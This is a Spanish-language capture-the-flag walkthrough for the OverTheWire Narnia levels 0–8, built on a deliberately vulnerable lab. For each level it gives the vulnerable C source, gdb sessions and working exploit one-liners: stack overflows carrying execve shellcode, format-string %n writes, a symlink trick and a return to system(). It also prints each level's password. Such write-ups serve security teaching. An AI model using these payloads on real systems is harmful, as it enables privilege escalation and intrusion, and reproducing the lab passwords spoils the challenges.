# Narnia - LAB_4

## Narnia0
ssh narnia0@narnia.labs.overthewire.org -p 2226
narnia0

~~~
cd /narnia/
./narnia0 
~~~
código fuente
~~~
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
~~~
Intentemos escribir 24 bytes como entrada y verifiquemos si la dirección cambia
~~~
python -c 'print 20 * "A" + "BBBB"' | ./narnia0
(python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
whoami
cat /etc/narnia_pass/narnia1

efeidiedae
~~~

## Narnia1
ssh narnia1@narnia.labs.overthewire.org -p 2226

~~~
cd /narnia/
./narnia1 
~~~
codigo fuente
~~~
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
~~~
el código ejecutará cualquier cosa que introduzcamos en la variable de entorno EGG
usando un shellcode aleatorio de la base de datos de exploits
~~~
section .text
global _start

_start:
    xor ecx, ecx
    mul ecx
    push ecx
    mov edi, 0x978CD0D0
    mov esi, 0x91969DD0
    not edi
    not esi
    push edi
    push esi
    mov ebx, esp
    mov al, 0xb
    int 0x80
~~~
Aquí está el código shell
~~~
\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x
export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`
./narnia1
whoami
cat /etc/narnia_pass/narnia2

nairiepecu
~~~

## Narnia2
ssh narnia2@narnia.labs.overthewire.org -p 2226

~~~
cd /narnia/
./narnia2
./narnia2 ABCD
~~~
codigo fuente
~~~
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
~~~

~~~
./narnia2 $(python -c 'print 140 * "A"')
gdb narnia2
set disassembly-flavor intel
disass main
run $(python -c 'print 140 * "A"')
continue
run $(python -c 'print 132 * "A" + "BBBB"')

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

set disassembly-flavor intel
break *main+68
run $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')
x/100x $esp+500

run $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')
continue

./narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')
whoami
cat /etc/narnia_pass/narnia3

vaequeezee
~~~

## Narnia3
ssh narnia3@narnia.labs.overthewire.org -p 2226

~~~
cd /narnia/
./narnia3
~~~
codigo fuente
~~~
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
~~~
Verifiquemos el valor de ofile con GDB
Como el puntero ofile se colocará en EAX podemos ver su valor
~~~
gdb narnia3
break *main+93
run test
x/s $eax

run /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/whatever
x/s $eax

mkdir -p /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp
ln -s /etc/narnia_pass/narnia4 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
touch /tmp/ax
chmod 777 /tmp/ax
./narnia3 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
cat /tmp/ax

thaenohtai
~~~

## Narnia4
ssh narnia4@narnia.labs.overthewire.org -p 2226
~~~
cd /narnia/
./narnia4
~~~
codigo feunte
~~~
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
~~~
la variable del búfer tiene 256 bytes y no hay verificación de límites

~~~
gdb narnia4
set disassembly-flavor intel
run $(python -c 'print 264 * "A" + 4 * "B"')

break *main+121
run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')
x/100x $esp+600
run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
continue

./narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
whoami
cat /etc/narnia_pass/narnia5

faimahchiy
~~~

## Narnia5
ssh narnia5@narnia.labs.overthewire.org -p 2226
~~~
cd /narnia/
./narnia5
~~~
vemos el codigo fuente
~~~
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
~~~
necesitamos encontrar la posición de AAAA en la pila
~~~
./narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x
./narnia5 $(python -c 'print "AAAA" + "%1$n"')
./narnia5 $(python -c 'print "\xc0\xd6\xff\xff" + "%496x%1$n"')
whoami
cat /etc/narnia_pass/narnia6

neezocaeng
~~~

## Narnia6
ssh narnia6@narnia.labs.overthewire.org -p 2226
~~~
cd /narnia/
./narnia6
./narnia6 123 456
~~~
codigo fuente

~~~
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);

	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
~~~
ejecutamos GDB y colocamos un punto de interrupción en fp(b1) y analizamos la pila
~~~
gdb narnia6
set disassembly-flavor intel
disas main
break *main+319
run AAAA BBBB
x/16wx $esp
x/x $eax
~~~
Aquí podemos ver nuestros argumentos AAAA
~~~
run AAAAAAAACCCC BBBB
x/16wx $esp
x/x $eax
p system
run $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')
x/16wx $esp
continue
~~~
slimos de GDB
~~~
./narnia6 $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')
whoami
cat /etc/narnia_pass/narnia7

ahkiaziphu
~~~

## Narnia7
ssh narnia7@narnia.labs.overthewire.org -p 2226

~~~
cd /narnia/
./narnia7
./narnia7 test
~~~
codigo fuente
~~~
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
~~~
podemos ver que hay una vulnerabilidad de formato de cadena en la función snprintf()

~~~
./narnia7 ABCD
./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%1$n"')
./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%2$n"')
whoami
cat /etc/narnia_pass/narnia8

mohthuphog
~~~

## Narnia8
ssh narnia8@narnia.labs.overthewire.org -p 2226

~~~
cd /narnia/
./narnia8
./narnia8 test
~~~ 
codigo fuente

~~~
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int i;

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;

	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){

	if(argc > 1)
		func(argv[1]);
	else
	printf("%s argument\n", argv[0]);

	return 0;
}
~~~

Aquí tenemos un desbordamiento potencial en la variable bok

~~~
./narnia8 $(python -c 'print 20 * "A"')
./narnia8 $(python -c 'print 21 * "A"')

gdb narnia8
set disassembly-flavor intel
disas func
break *func+106
run $(python -c 'print 20 * "A"')
run $(python -c 'print 21 * "A"')
x/16wx $esp
run $(python -c 'print 22 * "A"')
x/16wx $esp

run $(python -c 'print 20 * "A"')
x/16wx $esp
x/s 0xffffd871
~~~
La dirección 0x080484a7 es de hecho la dirección de retorno
~~~
run $(python -c 'print 20 * "A"')
x/20xw $esp
disas main
run $(python -c 'print 20 * "A"')
x/16x $esp

x/s *((char **)environ)
run $(python -c 'print 20 * "A" + "\x40\xd8\xff\xff" + "AAAA" + "\x92\xde\xff\xff"')
x/16xw $esp
continue
~~~
Busquemos la variable de entorno SHELLCODE con el siguiente código

~~~
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
~~~
compilarlo en /tmp

~~~
cd /tmp
gcc -m32 find_addr.c -o find_addr
./find_addr SHELLCODE
./narnia8  $(python -c 'print 20 * "A"')  | xxd
python -c 'print "{:8x}".format(0xffffd86a-12)'
./narnia8 $(python -c 'print 20 * "A" + "\x5e\xd8\xff\xff" + "AAAA" + "\xa1\xde\xff\xff"')
whoami
cat /etc/narnia_pass/narnia9

eiL5fealae
~~~


